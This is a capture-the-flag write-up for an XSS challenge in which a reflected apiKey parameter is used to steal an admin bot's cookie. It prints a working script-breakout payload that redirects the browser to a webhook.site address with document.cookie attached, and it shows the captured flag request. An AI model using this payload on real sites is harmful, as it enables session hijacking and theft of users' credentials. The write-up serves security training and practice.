
---

# XSS-GPT Writeup


![Challenge](./screenshot/XSS-GPT%201.png)
![Web-Page](./screenshot/XSS-GPT%202.png)

---

## Challenge

> I built a chatgpt website using chatgpt. Feel free to try it! Remember to report to me if you found any bug
>
> **Hint 1:** Try to change the parameter
> **Hint 2:** Try to steal admin’s cookie

The given bot code showed:

* The admin bot visits `http://127.0.0.1/?apiKey=<input>`
* A cookie named `flag` is set on that domain
* Our task is to grab it.

---

## Solution

### Step 1 — Intercept the request

Intercept the **Report Admin()** request in Burp Suite and send it to Repeater.
This confirmed the `apiKey` value is exactly what the admin bot loads.

![Burp Repeater 1](screenshot/XSS-GPT%203.png)

---

### Step 2 — Craft the payload

Get webhook URL first! 

![webhook.site](screenshot/XSS-GPT%204.png)


Payload (before encoding):

```html
</script><script>
location.href='https://webhook.site/<your-id>?c='+document.cookie
</script>
```

This makes the bot immediately redirect to my webhook with its cookie in the query string.

Encode this payload (URL/hex encoding) using Burp’s built-in encoder:

![Craft the payload](screenshot/XSS-GPT%205.png)

Encode payload to URL.

---

### Step 3 — Deliver to the admin

Visit the challenge site with the payload as the `apiKey` value, then click **Report Admin**.

The admin bot visits our malicious URL and executes the script.

![Sent method to repeater](screenshot/XSS-GPT%206.png)

![Report to admin screenshot](screenshot/XSS-GPT%207.png)

---

### Step 4 — Get the flag

Back in webhook.site, we see a request like:

```
GET /<your-id>?c=flag=SKR{...}
```

🎉 The flag was successfully stolen.

![Webhook screenshot](screenshot/XSS-GPT%208.png)

---

## Key Takeaways

* The vulnerable sink was the `apiKey` parameter, directly injected into the page.
* Breaking out of the `<script>` context allowed custom JS injection.
* Always encode payloads before injecting into URLs.
* Classic cookie-stealing XSS works perfectly against bot challenges.

---